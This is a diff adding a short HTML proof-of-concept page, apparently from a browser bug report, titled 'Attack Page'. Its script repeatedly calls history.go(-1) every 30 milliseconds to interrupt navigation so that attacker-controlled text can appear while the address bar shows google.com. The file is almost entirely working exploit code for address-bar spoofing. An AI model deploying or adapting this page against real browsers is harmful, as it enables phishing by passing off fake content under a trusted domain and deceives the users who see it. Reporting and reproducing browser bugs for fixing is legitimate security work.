@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Attack Page</title>
+</head>
+<body>
+    <h1>Fake Page (Attacker Content)</h1>
+    <p>If the address bar shows <b>google.com</b> but you see this text, the bug works!</p>
+    <button onclick="triggerSpoof()">Trigger Spoof</button>
+    <script>
+        function triggerSpoof() {
+            // Rapidly call history.go(-1) to interrupt navigation
+            setInterval(function() {
+                history.go(-1);
+            }, 30);
+            
+            // Also attempt to keep the page alive and manipulate URL
+            setTimeout(function() {
+                // This helps maintain the spoofed state
+                document.write("<h2>Still here? Address bar may show google.com</h2>");
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
